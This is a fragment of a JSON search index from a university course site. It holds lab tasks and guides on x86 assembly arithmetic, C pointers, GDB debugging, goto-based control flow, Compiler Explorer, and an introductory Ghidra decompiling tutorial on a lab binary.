If the program gives you a SIGFPE. Arithmetic exception,” you most likely forgot to initialize the upper part of the dividend (ah, dx, or edx). ",
    "url": "/labs/lab-05/tasks/div/README.html",
    
    "relUrl": "/labs/lab-05/tasks/div/README.html"
  },"158": {
    "doc": "Task: Division of Two Numbers",
    "title": "Testing",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_first_div ........................ passed ... 33 test_second_div ........................ passed ... 33 test_third_div ........................ passed ... 34 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-05/tasks/div/README.html#testing",
    
    "relUrl": "/labs/lab-05/tasks/div/README.html#testing"
  },"159": {
    "doc": "Task: Sum of First N Natural Numbers Squared",
    "title": "Task: Sum of First N Natural Numbers Squared",
    "content": "You will solve this exercise starting from the sum_n.asm file located in the tasks/sum-squared/support directory. In the sum_n.asm program, the sum of the first num natural numbers is calculated. Follow the code, observe the constructions and registers specific to working with bytes. Run the code. IMPORTANT: Proceed to the next step only after you have understood very well what the code does. It will be difficult for you to do the next exercise if you have difficulties understanding the current one. Start with the program sum_n.asm and create a program sum_n_squared.asm that calculates the sum of squares of the first num natural numbers (num &lt;= 100). TIP: You will use the eax and edx registers for multiplication to compute the squares (using the mul instruction). Therefore, you cannot easily use the eax register to store the sum of squares. To retain the sum of squares, you have two options: . | (easier) Use the ebx register to store the sum of squares. | (more complex) Before performing operations on the eax register, save its value on the stack (using the push instruction), then perform the necessary operations, and finally restore the saved value (using the pop instruction). | . NOTE: For verification, the sum of squares of the first 100 natural numbers is 338350. ",
    "url": "/labs/lab-05/tasks/sum-squared/README.html",
    
    "relUrl": "/labs/lab-05/tasks/sum-squared/README.html"
  },"160": {
    "doc": "Task: Sum of First N Natural Numbers Squared",
    "title": "Testing",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_sum_100 ........................ passed ... 50 test_sum_squares_100 ........................ passed ... 50 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-05/tasks/sum-squared/README.html#testing",
    
    "relUrl": "/labs/lab-05/tasks/sum-squared/README.html#testing"
  },"161": {
    "doc": "Task: Count Array Elements",
    "title": "Task: Count Array Elements",
    "content": " ",
    "url": "/labs/lab-05/tasks/vec-count-if/README.html",
    
    "relUrl": "/labs/lab-05/tasks/vec-count-if/README.html"
  },"162": {
    "doc": "Task: Count Array Elements",
    "title": "Count Negative and Positive Numbers from Array",
    "content": "You will solve this exercise starting from the count_pos_neg.asm file located in the tasks/vec-count-if/support directory. Your program should display the number of positive and negative values from the array. NOTE: Define a vector that contains both negative and positive numbers. TIP: Use the cmp instruction and conditional jump mnemonics. See details here. TIP: The inc instruction followed by a register increments the value stored in that register. ",
    "url": "/labs/lab-05/tasks/vec-count-if/README.html#count-negative-and-positive-numbers-from-array",
    
    "relUrl": "/labs/lab-05/tasks/vec-count-if/README.html#count-negative-and-positive-numbers-from-array"
  },"163": {
    "doc": "Task: Count Array Elements",
    "title": "Count Odd and Even Numbers from Array",
    "content": "Create a new file called count_even_odd.asm file located in the tasks/vec-count-if/support directory. Your program should display the number of even and odd values from this array: {1392, 12544, 7991, 6992, 7202, 27187, 28789, 17897, 12988, 17992}. TIP: You can use the div instruction to divide a number by 2 and then compare the remainder of the division with 0. NOTE: For testing, use an array containing only positive numbers. For negative numbers, sign extension should be performed; it would work without it because we are only interested in the remainder, but let’s be rigorous :-) . ",
    "url": "/labs/lab-05/tasks/vec-count-if/README.html#count-odd-and-even-numbers-from-array",
    
    "relUrl": "/labs/lab-05/tasks/vec-count-if/README.html#count-odd-and-even-numbers-from-array"
  },"164": {
    "doc": "Task: Count Array Elements",
    "title": "Testing",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In order to get the points, you should have a single line of output with the positive and negative number ordered in this way: . gibberish (text) number_of_positives gibberish (text / spaces) number_of_negatives . The same rule ^ is applied for even and odd. In case of a correct solution, you will get an output such as: . test_pos ........................ passed ... 25 test_neg ........................ passed ... 25 test_even ........................ passed ... 25 test_odd ........................ passed ... 25 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-05/tasks/vec-count-if/README.html#testing",
    
    "relUrl": "/labs/lab-05/tasks/vec-count-if/README.html#testing"
  },"165": {
    "doc": "Guide: Floating Point Exception",
    "title": "Guide: Floating Point Exception",
    "content": "To follow this guide, you’ll need to use the floating_point_exception.asm file located in the guides/floating-point-exception/support directory. The program tries to perform division using an 8 bit operand, bl, in this case the quotient should be in the range [0, 255]. Given that ax is 22891 and bl is 2, the result of the division would be out of the defined range. Thus we will see a Floating point exception after the division. Note: For a detailed description of the div instruction check out the documentation. ",
    "url": "/labs/lab-05/guides/floating-point-exception/README.html",
    
    "relUrl": "/labs/lab-05/guides/floating-point-exception/README.html"
  },"166": {
    "doc": "Guide: Declarations",
    "title": "Guide: Declarations",
    "content": "To follow this guide, you’ll need to use the declarations.asm file located in the guides/declarations/support directory. The program declares multiple variables of different sizes in the .bss and .data sections. Note: When defining strings, make sure to add a zero byte at the end, in order to mark the end of the string. decimal_point db \".\",0 . For a complete set of the pseudo-instruction check out the nasm documentation. ",
    "url": "/labs/lab-05/guides/declarations/README.html",
    
    "relUrl": "/labs/lab-05/guides/declarations/README.html"
  },"167": {
    "doc": "Guide: Multiply and Divide",
    "title": "Guide: Multiply and Divide",
    "content": "To follow this guide, you’ll need to use the multiply-divide.asm file located in the guides/multiply-divide/support directory. The program performs the mul and div instructions and prints out the results. Note: For a detailed description of the instruction check out the following pages: div and mul . ",
    "url": "/labs/lab-05/guides/multiply-divide/README.html",
    
    "relUrl": "/labs/lab-05/guides/multiply-divide/README.html"
  },"168": {
    "doc": "Guide: Addressing Arrays",
    "title": "Guide: Addressing Arrays",
    "content": "To follow this guide, you’ll need to use the addressing_arrays.asm file located in the guides/addressing-arrays/support directory. The program increments the values of an array of 10 integers by 1 and iterates through the array before and after to show the changes. Note: ecx is used as the loop counter. Since the array contains dwords (4 bytes), the loop counter is multiplied by 4 to get the address of the next element in the array. ",
    "url": "/labs/lab-05/guides/addressing-arrays/README.html",
    
    "relUrl": "/labs/lab-05/guides/addressing-arrays/README.html"
  },"169": {
    "doc": "Guide: Loop",
    "title": "Guide: Loop",
    "content": "To follow this guide, you’ll need to use the loop.asm file located in the guides/loop/support directory. This program illustrates how to use the loop instruction, as well as how to index an array of dwords. Note: The loop instruction jumps to the given label when the count register is not equal to 0. In the case of x86 the count register is ecx. Note: For a detailed description of the loop instruction check out the documentation. ",
    "url": "/labs/lab-05/guides/loop/README.html",
    
    "relUrl": "/labs/lab-05/guides/loop/README.html"
  },"170": {
    "doc": "Lab 5 - Registers and Memory Addressing",
    "title": "Lab 5 - Registers and Memory Addressing",
    "content": " ",
    "url": "/labs/lab-05/README.html",
    
    "relUrl": "/labs/lab-05/README.html"
  },"171": {
    "doc": "Lab 5 - Registers and Memory Addressing",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-05/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-05/README.html#getting-the-latest-changes"
  },"172": {
    "doc": "Lab 5 - Registers and Memory Addressing",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-04\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-05: . student@hsi:~/hardware-software-interface$ git checkout -b lab-05 main # Replace lab-05 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-05/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-05/README.html#save-progress-and-prepare-next-lab"
  },"173": {
    "doc": "Task: Iterating through an Integer Array",
    "title": "Task: Iterating through an Integer Array",
    "content": "You will solve this exercise starting from the iterate.c file located in the tasks/iterate/support directory. Here is the given piece of C code: . #include &lt;stdio.h&gt; int main() { int v[] = {0xCAFEBABE, 0xDEADBEEF, 0x0B00B135, 0xBAADF00D, 0xDEADC0DE}; return 0; } . Display the addresses of the elements in the v array along with their values. Iterate through the addresses in v byte by byte, two bytes at a time, and four bytes at a time. TIP: You can iterate through memory byte by byte starting from a specific address using a pointer of type unsigned char* (since the char type is represented by one byte). unsigned char *char_ptr = v; . For displaying the address and the value, you can use: . printf(\"%p -&gt; 0x%x\\n\", char_ptr, *char_ptr); . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_chars ........................ passed ... 33 test_shorts ........................ passed ... 33 test_ints ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-02/tasks/iterate/README.html",
    
    "relUrl": "/labs/lab-02/tasks/iterate/README.html"
  },"174": {
    "doc": "Task: Pointers",
    "title": "Task: Pointers",
    "content": "You will solve this exercise starting from the pointers.c file located in the tasks/pointers/support directory. Implement the functions memcpy(), strcpy(), and strcmp() using pointer operations. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_strcmp_equal ........................ passed ... 10 test_strcmp_diff ........................ passed ... 10 test_strcmp_diff2 ........................ passed ... 10 test_memcpy_basic ........................ passed ... 10 test_memcpy_partial ........................ passed ... 10 test_memcpy_struct ........................ passed ... 10 test_memcpy_overlap ........................ passed ... 10 test_strcpy_basic ........................ passed ... 10 test_strcpy_empty ........................ passed ... 10 test_strcpy_long_string ........................ passed ... 10 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-02/tasks/pointers/README.html",
    
    "relUrl": "/labs/lab-02/tasks/pointers/README.html"
  },"175": {
    "doc": "Task: Data Inspection",
    "title": "Task: Data Inspection",
    "content": "You will solve this exercise starting from the inspect.c file located in the tasks/inspect/support directory. Given the following declarations: . #include &lt;stdio.h&gt; int main() { unsigned int a = 4127; int b = -27714; short c = 1475; int v[] = {0xCAFEBABE, 0xDEADBEEF, 0x0B00B135, 0xBAADF00D, 0xDEADC0DE}; unsigned int *int_ptr = (unsigned int *) &amp;v; for (int i = 0 ; i &lt; sizeof(v) / sizeof(*int_ptr) ; ++i) { ++int_ptr; } return 0; } . Compile the source code and run the executable with GDB. Set a breakpoint at main and observe how the data is represented in memory. For this task, you will use the print and examine commands. NOTE: . | To display the value of a variable in hexadecimal, use p/x variable_name | To display the value from a pointer, use p *pointer_name, and to inspect the data at a memory address, use x memory_address. | . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-02/tasks/inspect/README.html",
    
    "relUrl": "/labs/lab-02/tasks/inspect/README.html"
  },"176": {
    "doc": "Task: Deleting the First Occurrence of a Pattern from a String",
    "title": "Task: Deleting the First Occurrence of a Pattern from a String",
    "content": "You will solve this exercise starting from the delete-first.c file located in the tasks/delete-first/support directory. Given a string and a pattern, implement the delete_first(char *s, char *pattern) function that returns the string obtained by removing the first occurrence of the pattern in s. NOTE: For s = \"Ana are mere\" and pattern = \"re\", the function should return the string “Ana a mere”. IMPORTANT: Warning . char *s = \"Ana are mere\"; // allocates the string in a read-only memory area (immutable content) char s[] = \"Ana are mere\"; // allocates the string in a read-write memory area (modifiable content) . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_no_appearances ........................ passed ... 33 test_one_appearance ........................ passed ... 33 test_multiple_appearances ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-02/tasks/delete_first/README.html",
    
    "relUrl": "/labs/lab-02/tasks/delete_first/README.html"
  },"177": {
    "doc": "Task: Pixels",
    "title": "Task: Pixels",
    "content": "You will solve this exercise starting from the pixels.c file located in the tasks/pixels/support directory. Consider the structure of a pixel and an image described in the pixel.h file: . typedef struct Pixel { unsigned char R; unsigned char G; unsigned char B; } Pixel; typedef struct Picture { int height; int width; Pixel **pix_array; } Picture; . Implement the following: . | The reverse_pic(struct picture *pic) function, which takes a Picture as a parameter and returns the reversed image. By a reversed image, we mean the inversion of the rows of the pix_array matrix in the Picture structure. | The color_to_gray(struct picture *pic) function, which takes a Picture as a parameter and returns the new image by converting each pixel to its grayscale value. The grayscale value of a pixel is calculated using the following formula: | . p.r = 0.3 * p.r; p.g = 0.59 * p.g; p.b = 0.11 * p.b; . IMPORTANT: Accessing the elements of the pixel matrix will be done using pointer operations. Hint: For simplicity, you can use the following macro: . #define GET_PIXEL(a, i ,j) (*(*((a) + (i)) + (j))) . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_reverse ........................ passed ... 50 test_color_to_gray ........................ passed ... 50 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-02/tasks/pixels/README.html",
    
    "relUrl": "/labs/lab-02/tasks/pixels/README.html"
  },"178": {
    "doc": "Task: Find Maximum in Array",
    "title": "Task: Find Maximum in Array",
    "content": "You will solve this exercise starting from the find-max.c file located in the tasks/find-max/support directory. Implement the following functions: . find_max(void *arr, int n, int element_size, int (*compare)(const void *, const void *)) . which calculates the maximum element from an array based on a given comparison function: . compare(const void *a, const void *b) . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_compare ........................ passed ... 30 test_find_max ........................ passed ... 70 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-02/tasks/find_max/README.html",
    
    "relUrl": "/labs/lab-02/tasks/find_max/README.html"
  },"179": {
    "doc": "Guide: GDB Tutorial - Debugging a Segfault",
    "title": "Guide: GDB Tutorial - Debugging a Segfault",
    "content": "To follow this guide, you’ll need to use the segfault.c file located in the guides/segfault/support directory. Compile and run the source code from the skeleton (if you are not using the Makefile, make sure to compile with the -g flag). In short, the program takes a number n, allocates a vector of size n, and initializes it with the first n numbers from the Fibonacci sequence. However, after running the program, you see: Segmentation fault (core dumped). Start GDB with the executable: . gdb ./segfault . Once you have started GDB, all interaction happens through the GDB prompt. Run the program using the run command. What do you notice? GDB hangs at the input reads. Set a breakpoint at main using the break main command. You will see the message in the prompt: . Breakpoint 1 at 0x7d3: file segfault.c, line 21 /* The memory address should not be the same */ . Next, we will step through the instructions one by one. To do this, use the next or n command (watch the GDB cursor to see the current instruction and repeat the process). You will notice that GDB hangs at scanf, so input a value for n and continue stepping through. If you have entered a large value for n and want to skip the iteration, use the continue command. Eventually, you will reach the line v[423433] = 3;, and GDB will display: . Program received signal SIGSEGV, Segmentation fault . Inspect the memory at v[423433] using x &amp;v[423433] and you will receive the message: . Cannot access memory at address 0x5555558f3e94 /* The memory address should not be the same */ . What happened? We accessed a memory area with restricted access. ",
    "url": "/labs/lab-02/guides/segfault/README.html",
    
    "relUrl": "/labs/lab-02/guides/segfault/README.html"
  },"180": {
    "doc": "Guide: Array vs. Pointer",
    "title": "Guide: Array vs. Pointer",
    "content": "To follow this guide, you’ll need to use the array_vs_pointer.c file located in the guides/array_vs_pointer/support directory. Compile and run the source from the skeleton. The program simply declares an array chars and a char pointer, we’ll try to understand the difference between the two. We can observe the fact that even though both of them point to the same sequence of characters, the sizeof operator returns different values: the number of bytes needed for the array (13), while for the pointer, it simply returns its size as a data type (4/8 on most systems). sizeof(v): 13 sizeof(p): 8 . We’ve previously learned that an array is also technically a pointer to the first element of the array, so why would it be in any way different? This behaviour is a consequence that comes from the fact that the value of the pointer which represents the array is constant and cannot be changed. This means that we can determine the size of the array at compile time since it is not possible to make it point to a different memory location, but for a regular pointer like the one declared in the example, the address which it points to can be changed at runtime, so it will not always points to an array of the same size and we cannot even determine if it will point to an array at all (it could point to a single variable for example). The second difference appears when attempting to change the value of one of the characters in the sequence, it seems that we can’t do it using the pointer, while we can do it using the array. This is a consequence of the fact that the pointer points to read-only memory (the string literal, which we’ll later learn is stored in a memory area called .rodata), while the array points to its own allocated memory, which is writable. ",
    "url": "/labs/lab-02/guides/array-vs-pointer/README.html",
    
    "relUrl": "/labs/lab-02/guides/array-vs-pointer/README.html"
  },"181": {
    "doc": "Lab 2 - Memory Operations. Introduction to GDB",
    "title": "Lab 2 - Memory Operations. Introduction to GDB",
    "content": " ",
    "url": "/labs/lab-02/README.html",
    
    "relUrl": "/labs/lab-02/README.html"
  },"182": {
    "doc": "Lab 2 - Memory Operations. Introduction to GDB",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-02/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-02/README.html#getting-the-latest-changes"
  },"183": {
    "doc": "Lab 2 - Memory Operations. Introduction to GDB",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-01\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-02: . student@hsi:~/hardware-software-interface$ git checkout -b lab-02 main # Replace lab-02 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-02/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-02/README.html#save-progress-and-prepare-next-lab"
  },"184": {
    "doc": "Task: Vector Max",
    "title": "Task: Vector Max",
    "content": "For the algorithm below, write C code without using: . | function definitions/calls (except for scanf() and printf()) | else | for | while | do {} while | if constructs containing return | nested if statements | . The only permitted statement within an if construct is goto. In other words, all the code must be written inside the vector_max function, and the control flow modification (jumping to another code area) is done only through sequences like if (condition) goto label; or goto label;. Implement an algorithm for finding the largest element of an array using C code and the above constraints. The skeleton for the code is in vector_max/support/vector_max.c. WARNING: We reiterate that the use cases of the goto statement are limited. This exercise has educational value to get you accustomed to jump instructions that we will use in assembly language development. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_max_middle_of_array ........................ passed ... 33 test_max_end_of_array ........................ passed ... 33 test_max_beginning_of_array ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-03/tasks/vector_max/README.html",
    
    "relUrl": "/labs/lab-03/tasks/vector_max/README.html"
  },"185": {
    "doc": "Task: Binary Search",
    "title": "Task: Binary Search",
    "content": "For the algorithm below, write C code without using: . | function definitions/calls (except for scanf() and printf()) | else | for | while | do {} while | if constructs containing return | nested if statements | . The only permitted statement within an if construct is goto. In other words, all the code must be written inside the binary_search function, and the control flow modification (jumping to another code area) is done only through sequences like if (condition) goto label; or goto label;. Implement binary search using C code and the above constraints. The skeleton for the code is in binary_search/support/binary_search.c. WARNING: We reiterate that the use cases of the goto statement are limited. This exercise has educational value to get you accustomed to jump instructions that we will use in assembly language development. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_15_found ........................ passed ... 25 test_7000_found ........................ passed ... 25 test_1_found ........................ passed ... 25 test_no_found ........................ passed ... 25 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-03/tasks/binary_search/README.html",
    
    "relUrl": "/labs/lab-03/tasks/binary_search/README.html"
  },"186": {
    "doc": "Writeup",
    "title": "Writeup",
    "content": "The exercise requires finding a randomly generated value in the main function using gdb for data extraction and Ghidra for understanding the code (it is designed to be solved before the assembly language labs). Upon completion, the code displays a link to a randomly chosen video from a list. The list of encrypted and base64-encoded links is stored in the variable enc_b64, and the list of links is stored in the variable links. The plaintext list is defined only if the macro REENCRYPT is defined. For solving the exercises, the macro is not defined, and the list is not visible. ",
    "url": "/labs/lab-03/tasks/old-hits/solution/README.html",
    
    "relUrl": "/labs/lab-03/tasks/old-hits/solution/README.html"
  },"187": {
    "doc": "Task: Reverse - Old Hits",
    "title": "Task: Reverse - Old Hits",
    "content": "Using Ghidra, as well as gdb, analyze the old-hits/support/old-hits binary and obtain the secret information. The program generates a random value and asks you to guess another value calculated based on the aforementioned one. If you’re having difficulties solving this exercise, go through this reading material. Note: The following error can occur when running the executable if you don’t have libcrypto.so.1.1 installed on your system: ./old-hits: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory . To install libcrypto.so.1.1 run the following commands: . wget http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2_amd64.deb sudo dpkg -i libssl1.1_1.1.1f-1ubuntu2_amd64.deb rm libssl1.1_1.1.1f-1ubuntu2_amd64.deb . ",
    "url": "/labs/lab-03/tasks/old-hits/README.html",
    
    "relUrl": "/labs/lab-03/tasks/old-hits/README.html"
  },"188": {
    "doc": "Guide: C - Warm-up GOTOs",
    "title": "Guide: C - Warm-up GOTOs",
    "content": ". | Modify the source code in the support/bogosort/bogosort.c file, by replacing the break instruction with a goto instruction (Bogosort). | Similarly, replace the continue instruction in support/ignore_the_comments/ignore_the_comments.c with a goto instruction without changing the functionality of the code. | . WARNING: When writing code with labels, please adhere to the following indentation recommendations: . | Do not indent labels. Keep them aligned with the left margin of the editing screen. | Each label should be on its own line. There is no code on the same line as the label. | Do not take labels into consideration when indenting the code. The code should be indented in the same way whether there are labels or not. | Leave a blank line before the line containing a label. | . NOTE: Situation where goto may be useful. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-03/guides/goto-warm-up/README.html",
    
    "relUrl": "/labs/lab-03/guides/goto-warm-up/README.html"
  },"189": {
    "doc": "Guide: Online C Compiling",
    "title": "Guide: Online C Compiling",
    "content": "An interesting tool to observe how C code translates into assembly language is Compiler Explorer. | Go to Compiler Explorer. | Load the “sum over array” program from the examples (accessible using the load button, shaped like a floppy disk). | Make sure x86-64 gcc 4.8.2 is selected under Compiler:. | Use the option -m32 (in Compiler options) to display code in 32-bit assembly language (as opposed to 64-bit by default). | If you see the message &lt;Compilation failed&gt;, add the option -std=c99. | Initially, the code might be quite cumbersome. To make it more human-readable, add the option -O2 to the compilation options (Compiler options). | You may notice the presence of symbols like .L3: and .L4:. These represent fixed points in the program, labels, quite similar to what is found in C. | Go through the compilers corresponding to the following architectures one by one: ARM, ARM64, AVR, PowerPC. Note: for ARM, ARM64, and AVR, you will need to remove the previously set -m32 flag. You can observe how the generated code differs from one architecture to another. | Also, try the following compilers: clang and icc. As you can see, even though it’s the same C code and the same architecture, the generated code differs. This happens because each compiler can have a different optimization and code generation strategy. | . NOTE: clang is an open-source C/C++ compiler. It is often used in IDEs due to its very suggestive compilation error messages. NOTE: icc is the C/C++ compiler from Intel. Write the following code sequence in the Code editor area: . int simple_fn(void) { int a = 1; a++; return a; } . Observe the assembly code when the compilation options (Compiler options) are -m32, and when the compilation options are -m32 -O2. Notice the effect of optimization options on the generated assembly code. ",
    "url": "/labs/lab-03/guides/compiler-explorer-tutorial/README.html",
    
    "relUrl": "/labs/lab-03/guides/compiler-explorer-tutorial/README.html"
  },"190": {
    "doc": "Guide: Ghidra Tutorial - Decompiling",
    "title": "Guide: Ghidra Tutorial - Decompiling",
    "content": "In this tutorial, we aim to show how to analyze the functionality of a simple binary that prompts for the input of a correct password to obtain a secret value. WARNING: In order to run Ghidra, access a terminal window and use the ghidra command. Initially, when we run Ghidra, a window will appear showing our current projects. We can create a new project and give it a suitable name. To do this, we will use: File → New Project (or using the keyboard shortcut CTRL + N). After creating the project, to add the executable file, we can use File → Import file, or drag the file into the directory we created. Ghidra will suggest the detected format and the compiler used. In more special cases, we may need to change these configurations, but for the purpose of this tutorial, Ghidra’s suggestions are perfect. The next step is to analyze the imported binary. We can double-click on it. Ghidra will ask us if we want to analyze it. To do this, we will click Yes and then Analyze. After the executable has been analyzed, Ghidra displays an interpretation of the binary information, which includes the disassembled code of the program. Next, for example, we can try to decompile a function. In the left part of the window, we have the Symbol Tree section; if we open Functions, we can see that Ghidra has detected certain functions, including the main function in the case of this binary. Therefore, if we double-click on main, the decompiled main function appears on the right, and in the central window, we see the corresponding assembly code. We will notice that the decompiled code is not an exact representation of the source code from the file crackme.c, but it gives us a fairly good idea of how it works and looks. Looking at the decompiled code, we notice that the main function has two long-type parameters named param_1 and param_2, instead of the normal prototype main(int argc, char *argv[]). The second parameter of main is of type “vector of pointers to character data” (which is generically interpreted as “array of strings”). Below is a generic perspective on how the vector is represented for a 64-bit system. In the representation on the second line, argp should be understood as char *argp = (char *)argv in order for the calculation argp + N to make sense. | argv[0] | argv[1] | argv[2] | . | argp | argp + 8 | argp + 16 | . The difference in parameter types of the main function is due to interpretation: the binary is compiled for the amd64 architecture (which is an extension of the x86 architecture for 64-bit systems), and the size of a processor word is 8 bytes (or 64 bits). The size of a processor word is reflected in the size of a pointer and also in the size of a single parameter (if the parameter is smaller than a word, it is automatically extended to the size of a word). Additionally, by coincidence, the size of a variable of type long is also 64 bits (the sizes of data types in C are not well-defined, only some lower limits for data types are defined). This causes the interpretation of both parameters as long, as all parameters, regardless of type (int or pointer), are manipulated identically. The calculation param_2 + 8 is used to calculate the address of the second pointer in the argv vector (that is, argv[1]). For a program compiled for the 32-bit x86 architecture, the address of argv[1] would have been param_2 + 4. Using the information from the decompiled code, we can infer that the program expects a password as an argument, and it must be 8 characters long, with the character at position 3 being ‘E’ (the first character is at position zero). ",
    "url": "/labs/lab-03/guides/ghidra-tutorial/README.html",
    
    "relUrl": "/labs/lab-03/guides/ghidra-tutorial/README.html"
  },"191": {
    "doc": "Lab 3 - Toolchain. GOTO",
    "title": "Lab 3 - Toolchain. GOTO",
    "content": " ",
    "url": "/labs/lab-03/README.html",
    
    "relUrl": "/labs/lab-03/README.html"
  },"192": {
    "doc": "Lab 3 - Toolchain. GOTO",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-03/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-03/README.html#getting-the-latest-changes"
  },"193": {
    "doc": "Lab 3 - Toolchain. GOTO",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-02\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-03: . student@hsi:~/hardware-software-interface$ git checkout -b lab-03 main # Replace lab-03 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-03/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-03/README.html#save-progress-and-prepare-next-lab"
  },"194": {
    "doc": "Labs",
    "title": "Labs",
    "content": "They are meant to be used by teachers, trainers, students and hobbyists who want to learn about the Assembly language, pointers, and memory security. Each lab has its own folder. Content for each lab covers a specific topic. Each topic is further split into different kinds of materials that refer to it. These may be any collection of the following: . | reading/: content to be assimilated by learners on their own | tasks/: practical exercises for learners | media/: images, videos, audio or auxiliary materials to be imported in text content | guides/: tutorials for learners with guided steps towards the solution | . ",
    "url": "/labs/README.html",
    
    "relUrl": "/labs/README.html"
  },"195": {
    "doc": "Labs",
    "title": "Cloning the Repository",
    "content": "If you haven’t already cloned the repository, do so and you are ready to go: . student@hsi:~$ git clone https://github.com/cs-pub-ro/hardware-software-interface.git student@hsi:~$ cd hardware-software-interface . ",
    "url": "/labs/README.html#cloning-the-repository",
    
    "relUrl": "/labs/README.html#cloning-the-repository"
